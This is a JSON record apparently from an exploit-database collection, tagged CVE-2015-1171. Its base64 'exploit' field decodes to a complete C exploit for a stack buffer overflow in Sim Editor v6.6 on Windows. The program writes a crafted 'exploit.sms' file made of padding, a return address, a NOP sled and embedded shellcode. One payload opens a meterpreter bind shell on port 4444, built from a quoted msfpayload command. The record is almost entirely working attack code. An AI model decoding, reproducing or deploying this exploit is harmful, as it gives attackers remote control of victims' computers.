{
    "source": "exploit-database", 
    "exploit": "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQoNCiNkZWZpbmUgU0laRSA2NTUzNiAgDQoNCi8qDQogKiBUaXRsZTogU2ltIEVkaXRvciB2Ni42IFN0YWNrIEJhc2VkIEJ1ZmZlciBPdmVyZmxvdw0KICogVmVyc2lvbjogNi42DQogKiBUZXN0ZWQgb246IFdpbmRvd3MgWFAgc3AyIGVuLCBXaW5kb3dzIDggNjQtYml0DQogKiBEYXRlOiAxNi0wMS0yMDE1DQogKiBBdXRob3I6IE9zYW5kYSBNYWxpdGggSmF5YXRoaXNzYQ0KICogRS1NYWlsOiBvc2FuZGFbY2F0XXVuc2Vlbi5pcw0KICogV2Vic2l0ZTogT3NhbmRhTWFsaXRoLndvcmRwcmVzcy5jb20NCiAqIENWRTogQ1ZFLTIwMTUtMTE3MQ0KICovDQoNCmNvbnN0IGNoYXIgc2hlbGwxW10gPSAiYmE1MTZhNDNkZGQ5ZTlkOTc0MjRmNDVlMzNjOWIxIiANCiAgICAgICAgCQkiMzIzMTU2MTUwMzU2MTU4M2VlZmNlMmE0OTZhYjU0IiANCiAgICAgICAgCQkiNDY2NzJjMDdjZjgyMWQxNWFiYzcwY2E5Yjg4YWJjIg0KICAgICAgICAJCSI0MmVjM2UzNjI2MzgzMGZmOGQxZTdmMDAyMDllZDMiDQogICAgICAgIAkJImMyMjI2MjJlMTc4NTViZTE2YWM0OWMxYzg0OTQ3NSINCiAgICAgICAgCQkiNmEzNzA5ZjIyZTg0MjhkNDI0YjQ1MjUxZmE0MWU5Ig0KICAgICAgICAJCSI1ODJiZjk2NjEyZDM3MTIwODJlMjU2MzJmZWFkZDMiDQogICAgICAgIAkJIjgxNzUyYzMyZDg3NjFlN2FiNzQ5YWU3N2M5OGUwOSINCiAgICAgICAgCQkiNjhiY2U0NjkxNWM3M2YxM2MxNDJkZGIzODJmNTA1Ig0KICAgICAgICAJCSI0NTQ2NjNjZTQ5MjNlNzg4NGRiMjI0YTM2YTNmY2IiDQogICAgICAgIAkJIjYzZmI3YmU4YTdhN2Q4OTFmZTBkOGVhZWUwZWE2ZiINCiAgICAgICAgCQkiMGI2YjE4N2IyZDM2Nzc3YWJmNGQzZTdjYmY0ZDExIg0KICAgICAgICAJCSIxNThlYzZmZTYyMGYwZGJiOWQ0NTBmZWEzNTAwZGEiDQogICAgICAgIAkJImFlNWJiMzMxZWM2NTMwYjM4ZDkxMjhiNjg4ZGVlZSINCiAgICAgICAgCQkiMmJlMTRmOWI0YjU2NmY4ZTI2MmJmZjUwZDFhNThiIg0KICAgICAgICAJCSI5MiI7IA0KDQovKiBtc2ZwYXlsb2FkIHdpbmRvd3MvbWV0ZXJwcmV0ZXIvYmluZF90Y3AgRVhJVEZVTkM9dGhyZWFkIExQT1JUPTQ0NDQgUiB8IG1zZmVuY29kZSAtYSB4ODYgLXQgYyAqLw0KY29uc3QgY2hhciBzaGVsbDJbXSA9ICJiYjNmZjhlZGM4ZGJjNmQ5NzQyNGY0NWYyYmM5YjEiDQoJCSI0YTgzZWZmYzMxNWYxMTAzNWYxMWUyY2EwNDA1NGUiDQoJCSIzNGY1ZDYyZmJkMTBlNzdkZDk1MTVhYjJhYTM0NTciDQoJCSIzOWZlYWNlYzRmZDZjMzQ1ZTUwMGVkNTZjYjhjYTEiDQoJCSI5NTRkNzBiOGM5YWQ0OTczMWNhZjhlNmVlZmZkNDciDQoJCSJlNDQyMTJlY2I4NWU5OWJlMmNlNzdlNzQ0Y2M2ZDAiDQoJCSIwMzE3YzhkM2MwMjM0MWNjMDUwZjFiNjdmZGZiOWEiDQoJCSJhMWNjMDRhZDhkODIzYTAxMDBkYjdiYTZmYmFlNzciDQoJCSJkNDg2YTg0M2E2NWMzZDU2MDAxNmU1YjJiMGZiNzMiDQoJCSIzMGJlYjBmMDFlYTM0N2Q1MTRkZmNjZDhmYTY5OTYiDQoJCSJmZWRlMzI0YzlmNDc5ZjIzYTA5ODQ3OWIwNGQyNmEiDQoJCSJjODMxYjllMjNkNzM0MmYzMjkwNDMxYzFmNmJlZGQiDQoJCSI2OTdlMTgxOThkNTVkY2I1NzA1NjFjOWZiNjAyNGMiDQoJCSJiNzFmMmIwNzQ3OWZmZTg3MTcwZjUxNjdjOGVmMDEiDQoJCSIwZjAyZTA3ZTJmMmQyYTE3OWUwOTg2NzBlMmFkMzgiDQoJCSJkZDZiNGI1MGNkM2RjM2NkMmYxYWRjNmE0ZjQ5NzAiDQoJCSIyMmM3YzY5ZWY0ZThkN2I0NTY0NDcwNWYyZDg2NDUiDQoJCSI3ZTMyODNlZTE3YTU1OTdlNTU1NzVkYWIwZjk3Y2IiDQoJCSI1Nzg2YzA2MzU1ZmYyNzJjYTYyYTNjZTUzMjk1MmIiDQoJCSIwYWQyMTVhYzVjYjgxNWM0Mzg5ODQ1ZjE0NjM1ZmEiDQoJCSJhYWQyYjVhYjFmNzRkZDUxNzliMjQyYTlhYzQyYmYiDQoJCSI3Yzg5YzBjOTBhZjkwOCI7DQoNCmNvbnN0IGNoYXIgKnNoZWxsc1tdID0geyBzaGVsbDEsIHNoZWxsMiB9Ow0KY29uc3QgY2hhciAqc2hlbGxfbmFtZXNbXSA9IHsgIk1TIFBhaW50IiwgIkJpbmQgU2hlbGwiIH07DQpjb25zdCBjaGFyICpzaGVsbF9pbmZvW10gPSB7ICIiLCAiWypdIENvbm5lY3Qgb24gcG9ydCA0NDQ0XG4iIH07DQpjb25zdCBzaXplX3QgU0hFTExTX0NPVU5UID0gMjsNCg0KaW50IG1lbnUoKSB7DQogICAgc2l6ZV90IHNoZWxsX3R5cGUgPSBTSEVMTFNfQ09VTlQ7DQogICAgcHV0cygiXGJbP10gQ2hvb3NlIGFuIE9wdGlvbjogIik7DQogICAgc2l6ZV90IGk7DQogICAgZm9yIChpID0gMDsgaSA8IFNIRUxMU19DT1VOVDsgaSsrKSBwcmludGYoIiVkLiAlc1xuIiwgaSwgc2hlbGxfbmFtZXNbaV0pOw0KICAgIHNjYW5mKCIlaSIsICZzaGVsbF90eXBlKTsNCglyZXR1cm4gc2hlbGxfdHlwZTsNCn0NCg0Kdm9pZCBiYW5uZXIoKSB7DQogICAgc3RhdGljIGNvbnN0IGNoYXIgYmFubmVyW10gPSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICIgX19fX18gXyAgICAgICAgICBfX19fXyAgIF8gXyBfICAgICAgICAgICBcbiINCiAgICAgICAgICAgICAgICAifCAgIF9ffF98X19fX18gICB8ICAgX198X3wgfF98IHxfIF9fXyBfX18gXG4iDQogICAgICAgICAgICAgICAgInxfXyAgIHwgfCAgICAgfCAgfCAgIF9ffCAuIHwgfCAgX3wgLiB8ICBffFxuIg0KICAgICAgICAgICAgICAgICJ8X19fX198X3xffF98X3wgIHxfX19fX3xfX198X3xffCB8X19ffF98XG4iDQogICAgICAgICAgICAgICAgIlxuW35dIFNpbSBFZGl0b3IgdjYuNiBTdGFjayBCYXNlZCBCdWZmZXIgT3ZlcmZsb3dcbiINCiAgICAgICAgICAgICAgICAiW35dIEF1dGhvcjogT3NhbmRhIE1hbGl0aCBKYXlhdGhpc3NhXG4iDQogICAgICAgICAgICAgICAgIlt+XSBFLU1haWw6IG9zYW5kYVtjYXRddW5zZWVuLmlzXG4iDQogICAgICAgICAgICAgICAgIlt+XSBXZWJzaXRlOiBPc2FuZGFNYWxpdGgud29yZHByZXNzLmNvbVxuXG4iOw0KDQogICAgZndyaXRlKGJhbm5lciwgc2l6ZW9mKGNoYXIpLCBzaXplb2YoYmFubmVyKSAsIHN0ZG91dCk7DQp9DQoNCnZvaWQgcGF0dGVybmZpbGwoY2hhciAqZHN0LCBjaGFyICpwYXR0ZXJuLCBzaXplX3QgY291bnQsIHNpemVfdCBkc3Rfc2l6ZSkgew0KICAgIHNpemVfdCBwYXR0ZXJuX2xlbiA9IHN0cmxlbihwYXR0ZXJuKTsNCiAgICBjb3VudCAqPSBwYXR0ZXJuX2xlbjsNCiAgICBpZiAoY291bnQgPiBkc3Rfc2l6ZSkgY291bnQgPSBkc3Rfc2l6ZTsNCiAgICBpZiAocGF0dGVybl9sZW4gPiBkc3Rfc2l6ZSkgcGF0dGVybl9sZW4gPSBkc3Rfc2l6ZTsNCg0KICAgIHNpemVfdCBpLCBwSTsNCiAgICBmb3IgKGkgPSAwLCBwSSA9IDA7IGkgPCBjb3VudCA7IGkrKywgcEkrKykgew0KICAgICAgICBpZiAocEkgPT0gcGF0dGVybl9sZW4pIHBJID0gMDsNCiAgICAgICAgZHN0W2ldID0gcGF0dGVybltwSV07DQogICAgfQ0KfQ0KDQppbnQgbWFpbigpIHsNCiAgICBiYW5uZXIoKTsNCiAgICBpbnQgc2hlbGxfdHlwZSA9IG1lbnUoKTsNCiAgICBpZiAoc2hlbGxfdHlwZSA+PSBTSEVMTFNfQ09VTlQpIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gRW50ZXIgYSB2YWxpZCBpbnB1dFxuIik7DQogICAgICAgIGV4aXQgKDEpOw0KICAgIH0NCg0KICAgIGNoYXIgKmJ1ZmYgPSAoY2hhciopIGNhbGxvYyAoU0laRSwgc2l6ZW9mKGNoYXIpKTsNCiAgICBjaGFyICpub3BzID0gKGNoYXIqKSBjYWxsb2MgKFNJWkUsIHNpemVvZihjaGFyKSk7DQogICAgaWYgKCFidWZmIHx8ICFub3BzKSBleGl0ICgxKTsNCg0KICAgIHBhdHRlcm5maWxsKGJ1ZmYsICI0MSIsIDQwNSwgU0laRSk7DQogICAgcGF0dGVybmZpbGwobm9wcywgIjkwIiwgMTYsIFNJWkUpOw0KDQogICAgY2hhciByZXRbXSA9ICJCMzgwNDIwMCI7DQogICAgY29uc3QgY2hhciogZmlsZW5hbWUgPSAiZXhwbG9pdC5zbXMiOw0KDQogICAgRklMRSAqb3V0ZmlsZSA9IGZvcGVuKGZpbGVuYW1lLCAidyIpOw0KICAgIGlmICghb3V0ZmlsZSkgew0KICAgICAgICBwcmludGYoIiVzXG4iLCJDb3VsZCBub3Qgb3BlbiBmaWxlIik7DQogICAgICAgIGV4aXQgKDEpOw0KICAgIH0NCg0KICAgIGZwdXRzKGJ1ZmYsICAgb3V0ZmlsZSk7DQogICAgZnB1dHMocmV0LCAgICBvdXRmaWxlKTsNCiAgICBmcHV0cyhub3BzLCAgIG91dGZpbGUpOw0KDQogICAgZnB1dHMoc2hlbGxzW3NoZWxsX3R5cGVdLCAgb3V0ZmlsZSk7DQogICAgcHJpbnRmKCIlcyIsIHNoZWxsX2luZm9bc2hlbGxfdHlwZV0pOw0KICAgIGZjbG9zZShvdXRmaWxlKTsNCiAgICBmcmVlKGJ1ZmYpOw0KICAgIHByaW50ZigiWytdIFN1Y2Nlc3NmdWxseSB0byB3cml0dGVuIHRvOiBcIiVzXCJcbiIsIGZpbGVuYW1lKTsgDQogICAgcmV0dXJuIDA7DQp9DQovKkVPRiov", 
    "filename": "platforms/windows/local/35821.txt", 
    "id": "35821", 
    "cves": [
        "CVE-2015-1171"
    ]
}